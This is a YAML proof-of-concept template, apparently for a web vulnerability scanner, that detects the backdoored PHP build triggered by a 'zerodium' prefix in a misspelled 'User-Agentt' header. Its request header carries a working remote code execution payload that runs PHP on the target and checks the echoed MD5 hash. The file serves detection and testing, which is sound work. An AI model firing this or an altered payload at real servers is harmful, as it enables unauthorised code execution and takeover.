name: poc-yaml-php-zerodium-backdoor
set:
  f1: randomInt(800000000, 900000000)
rules:
  - method: GET
    path: /
    headers:
      User-Agentt: zerodiumvar_dump(md5({{f1}}));
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(bytes(substr(md5(string(f1)), 0, 31)))
detail:
  author: Loneyer
  links:
    - https://github.com/phith0n/phpsrc-debug-docker/
